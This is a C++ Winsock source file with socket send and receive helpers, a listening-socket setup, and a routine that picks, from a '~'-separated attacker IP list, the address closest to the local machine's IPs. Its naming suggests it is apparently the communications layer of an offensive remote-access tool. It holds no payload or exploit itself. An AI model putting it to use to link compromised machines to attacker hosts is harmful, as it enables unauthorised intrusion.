
#include "internet.h"


BOOL IsQuickTerm(PASS_DATA result) {
    return result.err && (result.value == 10054 || result.value == 10060 || result.value == 10053 || result.value == 0);
}


PASS_DATA root_internet::RecvData(SOCKET GetFrom, int Size, PVOID ToBuf, BOOL Silent, int Flags) {
    PASS_DATA RecRes;

    // Receive data -
    int result = recv(GetFrom, (char*)ToBuf, Size, Flags);
    if (result > 0) {
        // size > 0 = received some data -

        RecRes.err = FALSE;
        RecRes.value = result;
        if (!Silent) {
            printf("Successfully received %u bytes of data (REMEMBER TO FORMAT CORRECTLY)\n", result);
            if (result != Size) {
                printf("Mismatch between sizes (expected %llu, received %llu)\n", (ULONG64)Size, (ULONG64)result);
            }
        }
    }

    else if (result == 0) {
        // size = 0 = did not receive any data -

        RecRes.err = TRUE;
        RecRes.value = result;
        if (!Silent) {
            printf("Socket connection to sending socket was closed\n");
        }
    }

    else {
        // size < 0 = error -

        RecRes.err = TRUE;
        RecRes.value = WSAGetLastError();
        if (!Silent) {
            std::cerr << "Error receiving data from sending socket: " << RecRes.value << "\n";
        }
    }

    RecRes.Term = IsQuickTerm(RecRes);
    return RecRes;
}


PASS_DATA root_internet::SendData(SOCKET SendTo, PVOID SrcData, int Size, BOOL Silent, int Flags) {
    PASS_DATA SndRes;

    // Send data -
    int sendResult = send(SendTo, (char*)SrcData, Size, Flags);
    if (sendResult == SOCKET_ERROR) {
        SndRes.value = WSAGetLastError();
        SndRes.err = TRUE;
        if (!Silent) {
            std::cerr << "Error sending data: " << SndRes.value << "\n";
        }
    }
    else {
        SndRes.value = sendResult;
        SndRes.err = FALSE;
        if (!Silent) {
            printf("Successfully sent %llu bytes\n", (ULONG64)SndRes.value);
        }
    }
    SndRes.Term = IsQuickTerm(SndRes);
    return SndRes;
}


NETWORK_INFO root_internet::InitNetInfo(sockaddr_in AddrInfo, USHORT Port, const char* IP, SOCKET Sock) {
    // ASSUMES: AddrInfo is initialized correctly (port number, ipv4, value of ip address)
    NETWORK_INFO Info;
    Info.AddrInfo = AddrInfo;
    Info.IP = IP;
    Info.Port = Port;
    Info.AsoSock = Sock;
    return Info;
}


void root_internet::CleanNetStack(SOCKET sockfrom) {
    char LastChr = NULL;
    PASS_DATA result;
    ULONG LastBytes = 0;
    BOOL Err = FALSE;

    int res = ioctlsocket(sockfrom, FIONREAD, &LastBytes);  // Get size of unreceived data in network stack
    if (res == 0) {
        while (LastBytes > 0) {
            result = RecvData(sockfrom, 1, &LastChr, TRUE, 0);
            if (result.err) {
                printf("Could not get the last bytes out of the network stack\n");
                Err = TRUE;
                break;
            }

            if (result.value <= 0) {
                break;
            }
            LastBytes -= result.value;
        }
        if (!Err) {
            printf("Network stack freed\n");
        }
    }
    else {
        printf("Could not get the amount of bytes to clear from network stack\n");
    }
}


void root_internet::SetNetStructs(const char* SrvIP, const char* SndIP, USHORT SrvPort, USHORT SndPort, NETWORK_INFO* NetArr) {

    // Medium information -
    sockaddr_in Addr;
    Addr.sin_family = AF_INET;
    Addr.sin_port = SrvPort;
    inet_pton(AF_INET, SrvIP, &(Addr.sin_addr));
    NetArr[0] = InitNetInfo(Addr, SrvPort, SrvIP, NULL);


    // Current information -
    sockaddr_in SndAddr;
    SndAddr.sin_family = AF_INET;
    SndAddr.sin_port = SndPort;
    inet_pton(AF_INET, SndIP, &(SndAddr.sin_addr));
    NetArr[1] = InitNetInfo(SndAddr, SndPort, SndIP, NULL);
    NetArr[2] = InitNetInfo(SndAddr, SndPort, SndIP, NULL);
}


int root_internet::StartComms(NETWORK_INFO* NetArr) {
    // Initialize Winsock (required for using sockets and socket functions) -
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Winsock initialization process failed\n";
        return 1;
    }



    // Create listening socket -
    SOCKET lsckt = socket(AF_INET, SOCK_STREAM, 0);
    if (lsckt == INVALID_SOCKET) {
        std::cerr << "Could not create socket object: " << WSAGetLastError() << "\n";
        WSACleanup();
        return 1;
    }
    NetArr[0].AsoSock = lsckt;



    // Bind socket -
    if (bind(NetArr[0].AsoSock, (sockaddr*)&NetArr[0].AddrInfo, sizeof(sockaddr)) == SOCKET_ERROR) {
        std::cerr << "Could not bind socket object: " << WSAGetLastError() << "\n";
        closesocket(NetArr[0].AsoSock);
        WSACleanup();
        return 1;
    }



    // Listen with socket for requests - (SOMAXCONN for backlog for max listening conc)
    if (listen(NetArr[0].AsoSock, 2) == SOCKET_ERROR) {
        std::cerr << "Could not start listening with socket object: " << WSAGetLastError() << "\n";
        closesocket(NetArr[0].AsoSock);
        WSACleanup();
        return 1;
    }
    return 0;
}


DWORD address_config::CompareIpAddresses(char* LocalHost, const char* RemoteAddr) {
    DWORD Score = 0;
    DWORD LocalInd = 0;
    DWORD RemoteInd = 0;
    DWORD MaskValue = 0x80;
    DWORD CurrMask = 0x80;
    DWORD MatchingFields = 0;
    DWORD LocalNumeric = 0;
    DWORD RemoteNumeric = 0;

    while (MatchingFields != 4) {
        while (LocalHost[LocalInd] != '.' && LocalHost[LocalInd] != '\0') {
            LocalNumeric *= 10;
            LocalNumeric += (LocalHost[LocalInd] - 0x30);
            LocalInd++;
        }

        while (RemoteAddr[RemoteInd] != '.' && RemoteAddr[RemoteInd] != '\0') {
            RemoteNumeric *= 10;
            RemoteNumeric += (RemoteAddr[RemoteInd] - 0x30);
            RemoteInd++;
        }

        while (CurrMask != 0) {
            if ((RemoteNumeric & CurrMask) == (LocalNumeric & CurrMask)) {
                Score++;
            }
            else {
                return Score;
            }
            CurrMask /= 2;
        }
        RemoteInd++;
        LocalInd++;
        MatchingFields++;
        LocalNumeric = 0;
        RemoteNumeric = 0;
        CurrMask = MaskValue;
    }
    return Score;  // If got here - 32, probably not possible, exactly like current IP address
}


BOOL address_config::MatchIpAddresses(char* TargetAddress, char* AttackerAddress, const char* AttackerIps) {
    char LocalHostName[80];
    char* CurrIp = NULL;
    char CurrAttacker[MAXIPV4_ADDRESS_SIZE] = { 0 };

    struct hostent* LocalIpsList = NULL;
    DWORD CompareScore = 0;
    DWORD CurrentScore = 0;
    DWORD AddrIndex = 0;
    DWORD AttackIndex = 0;
    WSADATA SockData = { 0 };
    if (WSAStartup(MAKEWORD(2, 2), &SockData) != 0) {
        return FALSE;
    }


    // Get the hostname of the local machine to get ip addresses -
    if (gethostname(LocalHostName, sizeof(LocalHostName)) == SOCKET_ERROR) {
        printf("%d when getting local host name!", WSAGetLastError());
        WSACleanup();
        return FALSE;
    }
    LocalIpsList = gethostbyname(LocalHostName);
    if (LocalIpsList == 0) {
        WSACleanup();
        return FALSE;
    }


    // Find the address pair with the most similar bits in the address -
    while (AddrIndex < strlen(AttackerIps)) {
        while (AttackerIps[AddrIndex] != '~' && AttackerIps[AddrIndex] != '\0') {
            CurrAttacker[AttackIndex] = AttackerIps[AddrIndex];
            AddrIndex++;
            AttackIndex++;
        }
        CurrAttacker[AttackIndex] = '\0';
        AttackIndex = 0;
        if (AttackerIps[AddrIndex] == '~') {
            AddrIndex++;
        }

        for (int i = 0; LocalIpsList->h_addr_list[i] != 0; ++i) {
            struct in_addr addr;
            memcpy(&addr, LocalIpsList->h_addr_list[i], sizeof(struct in_addr));
            CurrIp = inet_ntoa(addr);
            CurrentScore = CompareIpAddresses(CurrIp, CurrAttacker);
            if (CurrentScore > CompareScore) {
                CompareScore = CurrentScore;
                RtlZeroMemory(TargetAddress, MAXIPV4_ADDRESS_SIZE);
                RtlZeroMemory(AttackerAddress, MAXIPV4_ADDRESS_SIZE);
                memcpy(TargetAddress, CurrIp, strlen(CurrIp) + 1);
                memcpy(AttackerAddress, CurrAttacker, strlen(CurrAttacker) + 1);
            }
        }
    }

    WSACleanup();
    return TRUE;
}